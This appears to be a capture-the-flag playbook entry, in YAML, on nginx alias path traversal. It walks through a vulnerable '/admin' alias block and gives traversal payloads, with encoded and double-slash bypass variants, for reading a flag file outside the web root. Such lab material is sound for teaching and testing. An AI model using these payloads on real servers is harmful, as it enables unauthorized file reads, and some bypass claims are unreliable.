name: nginx_alias_path_traversal
category: web
tags: [path_traversal, nginx, alias, misconfiguration, directory_listing]
indicators:
  - "nginx alias directive"
  - "location /admin with alias"
  - "autoindex on"
  - "Path traversal via ../"
  - "Flag file outside web root"

tricks:
  - name: "Step 1: Identify nginx alias misconfiguration"
    when: "Found nginx configuration with alias"
    how: "Check location blocks and alias directives"
    payload: |
      # nginx.conf line 16-19:
      # location /admin {
      #     alias /var/www/html/;
      #     autoindex on;
      # }
      #
      # Vulnerability:
      # - location /admin maps to /var/www/html/
      # - autoindex on enables directory listing
      # - alias directive is vulnerable to path traversal
      # - Flag is in /var/www/flag.txt (outside /var/www/html/)

  - name: "Step 2: Understand alias path traversal"
    when: "Confirmed alias misconfiguration"
    how: "Analyze how alias resolves paths"
    payload: |
      # How alias works:
      # - Request: /admin/path
      # - Resolves to: /var/www/html/path
      #
      # Path traversal:
      # - Request: /admin../flag.txt
      # - Resolves to: /var/www/html/../flag.txt
      # - Normalizes to: /var/www/flag.txt
      #
      # This allows escaping the alias directory

  - name: "Step 3: Craft path traversal payload"
    when: "Ready to exploit"
    how: "Use ../ to escape alias directory"
    payload: |
      # Basic payload:
      /admin../flag.txt
      #
      # Resolves to:
      # /var/www/html/../flag.txt -> /var/www/flag.txt
      #
      # Alternative payloads:
      /admin..//flag.txt
      /admin%2e%2e/flag.txt  # URL encoded
      /admin%2e%2e%2fflag.txt

  - name: "Step 4: Access flag file"
    when: "Payload ready"
    how: "Send GET request to path traversal URL"
    payload: |
      GET /admin../flag.txt
      #
      # nginx processes:
      # 1. Matches location /admin
      # 2. Applies alias /var/www/html/
      # 3. Replaces /admin with /var/www/html/
      # 4. Result: /var/www/html/../flag.txt
      # 5. Normalizes to: /var/www/flag.txt
      # 6. Returns file content

  - name: "Step 5: Extract flag from response"
    when: "Request successful"
    how: "Read flag from response body"
    payload: |
      # Response contains flag file content directly
      # Flag format: FLAG{<sha256_hash>}
      #
      # Extraction:
      # import re
      # flag_match = re.search(r'FLAG\{[^}]+\}', resp.text, re.IGNORECASE)
      # if flag_match:
      #     flag = flag_match.group(0)
      #
      # Note: Flag file location: /var/www/flag.txt

  - name: "Alternative: Directory listing"
    when: "Need to explore directory structure"
    how: "Use /admin endpoint with autoindex"
    payload: |
      # /admin endpoint lists /var/www/html/ directory
      # Can see available files and directories
      # Helps identify flag location if not known

  - name: "Bypass techniques"
    when: "Basic path traversal blocked"
    how: "Use alternative encoding or techniques"
    payload: |
      # URL encoding:
      /admin%2e%2e/flag.txt
      /admin%2e%2e%2fflag.txt
      #
      # Double slashes:
      /admin..//flag.txt
      #
      # Multiple traversals:
      /admin../../flag.txt
      #
      # Note: nginx normalizes paths, so ../ works even with encoding
